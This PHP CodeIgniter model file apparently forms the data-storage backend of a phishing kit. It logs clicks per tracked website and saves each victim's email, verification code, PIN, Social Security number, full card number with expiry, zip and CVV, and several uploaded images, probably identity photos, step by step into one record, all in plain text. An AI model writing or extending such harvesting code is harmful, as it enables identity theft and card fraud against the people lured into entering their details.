<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Home_model extends CI_Model
{

	public function click_count($website_id, $id = '')
	{
		$data = [
			'user_id' 		=> $id,
			'website_id'	=> $website_id,
			'date'			=> date('Y-m-d h:i:s')
		];

		$this->db->insert('clicks', $data);
	}

	//get user by id
	public function get_user($id = '')
	{
		$query = $this->db->get_where('users', array('id' => $id));
		return $query->row();
	}


	public function store_email($website_id, $user_id = 0, $email)
	{
		$data = [
			'user_id' 		=> $user_id,
			'website_id'	=> $website_id,
			'email'			=> $email,
			'date'			=> date('Y-m-d h:i:s')
		];
		$this->db->insert('informations', $data);
		return $this->db->insert_id();
	}

	public function store_code($id, $code)
	{
		$data = [
			'code'		=> $code
		];

		$this->db->where('id', $id);
		$this->db->update('informations', $data);
		return true;
	}

	public function store_pin($id, $pin)
	{
		$data = [
			'pin'		=> $pin
		];

		$this->db->where('id', $id);
		$this->db->update('informations', $data);
		return true;
	}

	public function store_ssn($id, $ssn)
	{
		$data = [
			'ssn'		=> $ssn
		];

		$this->db->where('id', $id);
		$this->db->update('informations', $data);
		return true;
	}

	public function store_card($id, $number, $date, $zip, $cvv)
	{
		$data = [
			'number'		=> $number,
			'card_date'		=> $date,
			'zip'		=> $zip,
			'cvv'		=> $cvv
		];

		$this->db->where('id', $id);
		$this->db->update('informations', $data);
		return true;
	}

	public function store_image($id, $image)
	{
		$data = [
			'image_1'		=> $image
		];

		$this->db->where('id', $id);
		$this->db->update('informations', $data);
		return true;
	}

	public function store_image2($id, $image)
	{
		$data = [
			'image_2'		=> $image
		];

		$this->db->where('id', $id);
		$this->db->update('informations', $data);
		return true;
	}

	public function store_image3($id, $image)
	{
		$data = [
			'image_3'		=> $image
		];

		$this->db->where('id', $id);
		$this->db->update('informations', $data);
		return true;
	}
}
